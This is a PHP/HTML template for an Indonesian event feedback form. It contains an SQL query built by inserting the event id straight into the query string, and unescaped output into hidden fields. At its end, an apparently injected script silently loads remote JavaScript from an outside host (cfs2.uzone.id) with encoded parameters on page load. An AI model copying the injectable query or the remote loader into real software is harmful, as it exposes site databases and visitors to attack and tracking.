<!DOCTYPE html>
<html lang="en">


<!-- Mirrored from themes.webavenue.com.au/enstruct/html/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 16 Apr 2017 14:00:33 GMT -->
<head>
    <meta charset="utf-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <title>InterUKM || WEB</title>
    <meta name="keywords" content="">
    <meta name="description" content="">
    <meta name="author" content="">
    <!-- favicon -->
    <link rel="shortcut icon" type="image/png" href="favicon.png" /> 
    <!-- GOOGLE FONT -->
    <link href="https://fonts.googleapis.com/css?family=Poppins:400,500,600%7CRoboto:400,500,700" rel="stylesheet">

    <!-- CSS LIBRARY -->
    <link rel="stylesheet" type="text/css" href="<?php echo base_url('assets/css/lib/bootstrap.min.css'); ?>">
    <link rel="stylesheet" type="text/css" href="<?php echo base_url('assets/css/lib/animate.css'); ?>">
    <link rel="stylesheet" type="text/css" href="<?php echo base_url('assets/css/lib/font-awesome.min.css'); ?>">
    <link rel="stylesheet" type="text/css" href="<?php echo base_url('assets/css/lib/hover.css'); ?>">

    <!-- Style Sheets -->
    <link rel="stylesheet" type="text/css" href="<?php echo base_url('assets/css/bootstrap-datetimepicker.min.css'); ?>" />
    <link rel="stylesheet" type="text/css" href="<?php echo base_url('assets/css/jquery.bxslider.css'); ?>" />
    <link rel="stylesheet" type="text/css" href="<?php echo base_url('assets/css/jquery-ui.min.css'); ?>" />
    <link rel="stylesheet" type="text/css" href="<?php echo base_url('assets/css/swiper.min.css'); ?>" /> 


    <!-- Main css -->
    <link rel="stylesheet" type="text/css" href="<?php echo base_url('assets/style.css'); ?>" />
    <link rel="stylesheet" type="text/css" href="<?php echo base_url('assets/css/responsive.css'); ?>" />

    <!--[if lt IE 8]>
      <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.</p>
  <![endif]-->
    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>

      <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
      <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
  <![endif]--> 
</head>

<body>
    <?php
        include 'header.php';
        $this->load->library('session');
    ?>
    <!--header ends-->

    <div class="main-banner banner-holder">
        <main>
        
        <!--map holder-->

        <section class="primary-padding gray-bg contact-block">
            <div class="container">
                <div class="row  ">
                    <div class="col-md-12 col-sm-12">
                        <div class="main-title title-content text-center">
                            <h2 class="wow fadeInUp">Feedback Acara</h2>
                            <p>
                                Silahkan kirim kritik dan saran untuk acara
                            </p>
                        </div>
                    </div>
                    <!--title-->

                    <div class="col-md-8 offset-md-2 col-sm-8 offset-sm-2 mb-8">
                        <form class="enstruct-send-mail" method="POST" action="<?=base_url()?>event/kritik_saran">
                            <div class="row">
                                
                                <div class="form-group col-sm-6">
                                    <input type="text" placeholder="Nama" name="nama">
                                    <?php 
                                    // $nmev = $this->db->select('nama_event')->from('event')->where('id_event',$id);
                                    $q1 = $this->db->query(" select nama_event from event where id_event=$id");
                                    foreach($q1->result_array() as $row) {
                                        $nmev = $row['nama_event'];
                                    }
                                    // $query = $this->db->query($nmev);
                                    // $nmev = $this->db->get();
                                     ?>
                                    <input type="hidden" name="id_event" value="<?=$id?>">
                                    <input type="hidden" name="nama_event" value="<?=$nmev?>">
                                </div>
                                <!--email-->

                                <div class="form-group col-sm-6">
                                    <input type="text" placeholder="Email" name="email">
                                </div>
                                <!-- subject -->

                                <div class="form-group col-sm-12">
                                    <textarea placeholder="Kritik" name="kritik"></textarea>
                                </div>
                                <!-- message -->
                                <div class="form-group col-sm-12">
                                    <textarea placeholder="Saran" name="saran"></textarea>
                                </div>

                                <div class="col-sm-12">
                                    <button type="submit" class="btn btn-default btn-send-mail"> kirim</button>
                                </div>
                                <!-- button -->

                                <div class="col-sm-12 form-messages mt-4">
                                    <div class="alert alert-success d-none">
                                        <i class="fa fa-check"></i>
                                        <strong>Terimakasih</strong> kritik dan saran Anda telah tersimpan.
                                    </div>

                                    <div class="alert alert-danger d-none">
                                        <i class="fa fa-close"></i>
                                        <strong>Maaf,</strong> kritik dan saran Anda Gagal disimpan.
                                    </div>
                                </div>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </section>
        <!--contact block-->
    </main>
    <!--main ends-->
    
    </div>
    <!--banner ends-->

    
    <?php
        include 'footer.php';
    ?>
    <!--footer-->

    <!--back to top-->
    <a href="#" class="scrollup"><i class="fa fa-angle-up"></i></a>

    <!-- Js libery -->
    <script src="<?php echo base_url('assets/js/jquery-3.1.1.min.js'); ?>"></script>
    <script src="<?php echo base_url('assets/js/tether.min.js'); ?>"></script>
    <script src="<?php echo base_url('assets/js/bootstrap.min.js'); ?>"></script>
    <script src="<?php echo base_url('assets/js/modernizr.js'); ?>"></script>

    <!--jquery ui-->
    <script src="<?php echo base_url('assets/js/jquery-ui.js'); ?>"></script>

    <!-- slider js -->
    <script src="<?php echo base_url('assets/js/jquery.bxslider.min.js'); ?>"></script>
    <script src="<?php echo base_url('assets/js/swiper.jquery.min.js'); ?>"></script>    

    <!-- wow -->
    <script src="<?php echo base_url('assets/js/wow.min.js'); ?>"></script>

    <!-- Parallax -->
    <script type="text/javascript" src="<?php echo base_url('assets/js/jquery.parallax-1.1.3.js'); ?>"></script>
    <script type="text/javascript" src="<?php echo base_url('assets/js/jquery.localscroll-1.2.7-min.js'); ?>"></script>
    <script type="text/javascript" src="<?php echo base_url('assets/js/jquery.scrollTo-1.4.2-min.js'); ?>"></script>

    <!--datepicker-->
    <script src="<?php echo base_url('assets/js/bootstrap-datetimepicker.min.js'); ?>"></script>

    <!--counter-->
    <script src="<?php echo base_url('assets/js/jquery.countTo.js'); ?>"></script>

    <!--smooth scrollling-->
    <script src="<?php echo base_url('assets/js/jQuery.scrollSpeed.js'); ?>"></script>

    <!--Costom js-->
    <script src="<?php echo base_url('assets/js/main.js'); ?>"></script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs2.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssK%2fmsldK2DOE8eBC54IoRbF9ZIaN%2b9SnVw8kvLJ7tU7v6Z83Zaakpv6poBfHYoqnj%2fWztDfbDgI1B4xFlyVC4GVuChJNuM5isSMe8mFEOlA96Z7VoAOMWzTm4SysJxnI92n5w4evKOHwPsLhPGpX7IIqBoF595%2bxnHla%2ff9r6L%2fnc43AJHWi7EU9TWYgHE7lssDvGq2iILjycXGJ9Z5YegaffXH%2fTJp2rlz5ALsXdNkPHjAs8TKCS%2fdfrXWj803thBbugFTfVT6NdaocuEWZ77JDGydvxs%2bWrzpL6Z%2bI%2f1iYYmqUQWPGhPCjFGhqS0peLLydm%2fDnq7p1Apkbfk4jvDv2uZWTQkI%2b9BTvd9z930bqS38NA%2bXVKNZjqJNPPkOk1PiouJDvVk6Mr2VLSeyfRgaA%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>
